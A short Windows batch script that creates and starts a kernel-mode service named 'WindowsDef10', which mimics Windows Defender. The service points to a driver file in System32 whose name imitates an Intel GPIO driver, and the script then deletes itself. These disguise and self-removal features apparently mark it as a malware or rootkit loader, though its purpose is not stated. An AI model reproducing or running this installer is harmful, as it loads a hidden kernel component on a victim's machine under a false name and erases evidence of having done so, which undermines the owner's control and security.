@echo off
cd %~dp0
sc create WindowsDef10 binpath=C:\Windows\System32\iaLPSS9i_GPIO_CNL.sys type=kernel
sc start WindowsDef10
del "%~f0"